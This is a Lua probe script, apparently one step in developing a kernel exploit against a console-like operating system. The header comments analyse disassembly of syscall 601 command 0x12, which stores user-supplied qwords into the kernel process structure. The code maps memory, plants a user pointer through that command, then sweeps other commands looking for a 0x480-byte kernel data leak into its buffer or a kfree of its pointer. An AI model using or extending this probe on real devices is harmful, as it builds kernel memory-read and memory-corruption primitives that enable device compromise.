-- CRASH_CLASS: HIGH (the 0x578 consumer path ends in kfree)
-- PROBE 1355a: sys 601 cmd 0x12 - the process-structure write, with the right arg shape
--
-- Context: results/kernel_handlers/asm/sys_601_deep.asm:478-505 is the branch for
-- 601 cmd 0x12 (13.60):
--
--   ca0e03  copyin(udaddr=[rsi+0x10] (arg2), kaddr=[rbp-0xf0], len=0x20)
--   ca0e35  proc = [td+0x8]
--   ca0e3a  rax = [proc+0x528]; test rax,0x400; jne skip      ; one-shot bit
--   ca0e4f  rax |= 0x1000000; [proc+0x528] = rax
--   ca0e5c  rax = [rbp-0xf0]; [proc+0x578] = rax              ; user qword 0
--   ca0e6a  rax = [rbp-0xe8]; [proc+0x580] = rax              ; user qword 1
--
-- Every earlier probe sent scalars in arg2 (322a: 0x41414141/0x42424242,
-- 1194b/1195a: six zeros), so the copyin had garbage to read from and the call
-- answered -1. The shape that reaches the two stores is arg2 = a mapped
-- pointer to 0x20 bytes.
--
-- The consumer (results/kernel_handlers/asm/sys_601_deep.asm:1253-1277) copies
-- 0x480 bytes to [proc+0x578] and then frees it:
--   call 0x2591d0(rdi=r12 (=proc+0x578), rsi=r14, rdx=0x480)
--   call 0xc08df0(r12)                                        ; kfree
--
-- So if the stores land, a later command in this family either copies kernel
-- data into our buffer (a 0x480-byte kernel read) or frees our pointer.
--
-- [A] 601(0x12, 0, ptr) with ptr into a zeroed 0x20-byte block - does it return 0?
-- [B] 601(0x00, buf, 0x100) control, then each command 0x01-0x27 in turn with
--     buf, watching for any write into the 0x4000-byte sentinel region. Each
--     call is printed BEFORE it runs so a death is attributable.
-- [C] a second 0x12 call to see the one-shot bit answer differently.
--
-- -- prior art:
--   results/kernel_handlers/asm/sys_601_deep.asm:478-505,1253-1277
--   results/kernel_handlers/analysis/sys_601_deep.md:28,47,72-79
--   results/phase17_new_vectors/1194b_601_arg2_write_leak_20261104_181707.txt
--   results/phase17_new_vectors/1195a_601_attach_hunt_20261104_184447.txt
--   probes/phase17_new_vectors/322a_sys601_commands.lua

print("=== PROBE 1355a: 601 CMD 0x12 WITH A REAL ARG2 ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function hx(v)
    if v == nil then return "nil" end
    if type(v) == "number" and v < 0 then return tostring(v) end
    return string.format("0x%08X", v % 0x100000000)
end
local function sgn(val)
    if val == nil then return "nil" end
    local ok, h, l = pcall(function() return val.h, val.l end)
    if ok and type(h) == "number" and type(l) == "number" then
        local lo = l % 0x100000000
        if lo == 0xFFFFFFFF and (h % 0x100000000) == 0xFFFFFFFF then return "-1" end
        return string.format("0x%X_%08X", h % 0x100000000, lo)
    end
    if type(val) == "number" then
        if val < 0 then return tostring(val) end
        return string.format("0x%X", val)
    end
    return tostring(val)
end

local sc601 = make_syscall(601)
local sc477 = make_syscall(477)
local getpid = make_syscall(20)
print(string.format("[0] pid=%d", to_num(getpid(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))

local function mmap(px, prot)
    local a = to_num(sc477(uint64(0), uint64(px), uint64(prot or 3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
    if a ~= 0 and a < 0x800000000000 then
        for o = 0, px - 4, 4 do safe_wd(a + o, 0) end
    end
    return a
end

local buf = mmap(0x4000)
local struct = mmap(0x4000)
print(string.format("  buf=0x%X struct=0x%X", buf, struct))
if buf == 0 or struct == 0 then print("[!] mmap failed"); return end

local function fill_buf(v)
    for i = 0, 0xFFF do safe_wd(buf + i * 4, v) end
end
local function buf_changed()
    local n = 0
    for i = 0, 0xFFF do
        if safe_rd(buf + i * 4) ~= 0xA5A5A5A5 then n = n + 1 end
    end
    return n
end

local function call(cmd, a2, a3)
    local ok, ret = pcall(function() return sc601(uint64(cmd), uint64(a2), uint64(a3)) end)
    return ok and sgn(ret) or "PCALL-FAIL"
end

print("")
print("[A] 601(0x12, 0, struct) with struct = 0x20 zero bytes; qword0 = buf so a later copy is visible")
for i = 0, 7 do safe_wq(struct + i * 8, uint64(0)) end
safe_wq(struct, uint64(buf))
safe_wq(struct + 8, uint64(0x1111222233334444))
fill_buf(0xA5A5A5A5)
print(string.format("  0x12 first: %s", tostring(call(0x12, 0, struct))))
print(string.format("  0x12 again: %s", tostring(call(0x12, 0, struct))))

print("")
print("[B] consumer sweep: every command with buf as arg1")
local cmds = {0x00, 0x01, 0x02, 0x05, 0x06, 0x07, 0x09, 0x0a, 0x0b, 0x0d, 0x0e,
              0x0f, 0x10, 0x11, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19,
              0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23,
              0x24, 0x25, 0x26, 0x27}
for _, cmd in ipairs(cmds) do
    fill_buf(0xA5A5A5A5)
    print(string.format("  calling 0x%02X ...", cmd))
    local r = call(cmd, buf, 0x100)
    local n = buf_changed()
    if n > 0 then
        print(string.format("  0x%02X %s ch=%d %s %s %s %s", cmd, tostring(r), n,
            hx(safe_rd(buf)), hx(safe_rd(buf + 4)), hx(safe_rd(buf + 8)), hx(safe_rd(buf + 12))))
    else
        print(string.format("  0x%02X %s ch=0", cmd, tostring(r)))
    end
end

print("")
print(string.format("[Z] alive pid=%d", to_num(getpid(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))
print("=== PROBE 1355a COMPLETE ===")
